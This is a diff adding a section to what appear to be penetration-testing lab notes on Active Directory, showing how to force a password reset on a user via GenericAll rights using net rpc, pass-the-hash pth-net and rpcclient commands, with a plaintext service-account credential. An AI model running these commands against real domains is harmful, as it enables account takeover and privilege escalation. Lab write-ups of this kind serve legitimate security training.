@@ -340,7 +340,42 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members 'AB920' -Credential $Cr
 ```
 
 
-#### 2. Kerberoasting attack 
+#### 2. Force change of a password
+
+We have the user:
+
+```text
+svc_helpdesk
+U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+```
+
+with GenericAll on the user Christopher.Lewis. 
+
+![[nagoya2.png]]
+
+Forcing a change of password:
+
+```
+# Alternative 1: password
+net rpc password "christopher.lewis" "Lalalala1234." -U "NAGOYA-IND"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "nagoya-industries.com"
+
+# Alternative 2: LM hash
+pth-net rpc password 'Christopher.Lewis' 'Lalala1234.' -U 'NAGOYA-IND'/svc_helpdesk%'LMhash':'NThash' -S 'nagoya-industries.com'
+```
+
+Another method for forcing the change of password:
+
+```
+rpcclient -U nagoya-industries/svc_helpdesk 192.168.185.21
+
+# And then:
+setuserinfo christopher.lewis 23 'Password123'
+```
+
+
+
+
+#### 3. Kerberoasting attack 
 
 ```powershell
 # Creating a SecureString Object using damundsen
